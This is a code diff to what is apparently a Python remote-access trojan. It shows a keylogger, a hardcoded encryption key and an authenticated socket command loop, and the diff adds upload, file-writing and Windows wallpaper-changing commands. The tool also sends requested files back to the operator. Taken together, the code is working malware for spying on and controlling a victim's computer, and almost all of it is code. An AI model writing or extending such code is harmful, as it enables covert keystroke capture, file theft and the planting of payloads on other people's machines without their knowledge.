@@ -5,6 +5,7 @@ import os
 from pynput import keyboard
 from datetime import datetime
 from cryptography.fernet import Fernet
+import ctypes
 
 
 key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
@@ -72,6 +73,15 @@ def keylogger(keys: int,BUFFER_SIZE):
     
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
+def change_wallpaper(image_path):
+    if not os.path.exists(image_path):
+        return Encrypt(b"Not done")
+    
+
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
+    return Encrypt(b"Done")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -153,6 +163,24 @@ if authenticate():
                     connection.sendall(chunk)
             except:
                 connection.send(Encrypt(b'Wrong file name'))   
+        elif "upload" in data:
+            len_chunks = Decrypt(connection.recv(1024)).decode()
+            print(f"Chunks coming: {len_chunks}")
+            full_encrypted_data = b''
+            for i in range(int(len_chunks)):
+                chunk =connection.recv(1024)
+                full_encrypted_data += chunk 
+            file_name = data.split(" ")
+            with open(f"./{file_name[1]}","ab") as file:
+                file.write(Decrypt(full_encrypted_data))
+                file.close()
+                print("Done")          
+        elif "wall" in data:
+            file_name = data.split(" ")[1]
+            path = os.path.abspath(os.getcwd())
+            result = change_wallpaper(f"{path}\\{file_name}")
+            connection.sendall(Encrypt(b"1"))
+            connection.sendall(result)
         elif "keylogger" in data:
             keys = int(data.split(" ")[1])
             try:
